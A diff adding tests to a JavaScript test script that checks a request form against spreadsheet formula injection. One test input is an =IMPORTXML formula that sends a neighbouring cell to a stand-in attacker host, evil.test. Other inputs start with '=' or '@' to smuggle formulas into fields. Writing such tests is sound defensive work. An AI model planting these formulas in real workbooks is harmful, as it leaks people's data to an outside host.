@@ -329,5 +329,18 @@ m.setUp();
 check('the header row is ten wide again', REQ.rows[0].length === 10);
 check('and the last one is the key',      REQ.rows[0][9] === 'key');
 
+console.log('\nwhat a stranger types cannot become a formula in the workbook');
+/* =IMPORTXML(...) in a name field is not text once the workbook is opened: it
+   runs, as us, and can send a neighbouring cell to whoever wrote it. */
+call({action:'request', name:'=IMPORTXML("https://evil.test/?"&B2,"//a")',
+      email:'formula@clinic.my', organisation:'@SUM(A1:A9)', consent:true});
+const row = REQ.rows.find(x => String(x[2]) === 'formula@clinic.my');
+check('a name that starts with = is stored as text', row && String(row[1]).charAt(0) === "'", row && row[1]);
+check('...and so is an organisation that starts with @', row && String(row[2 - 1 + 2]).charAt(0) === "'", row && row[3]);
+check('an ordinary name is left exactly as it was',
+  REQ.rows.some(x => String(x[1]) === 'Dr Lim'), REQ.rows.map(x=>x[1]));
+check('an address that would be a formula is refused outright',
+  call({action:'request', name:'X', email:'=cmd@evil.test', consent:true}).ok === false);
+
 console.log(ok ? '\nall good' : '\nSOMETHING IS WRONG');
 process.exit(ok ? 0 : 1);
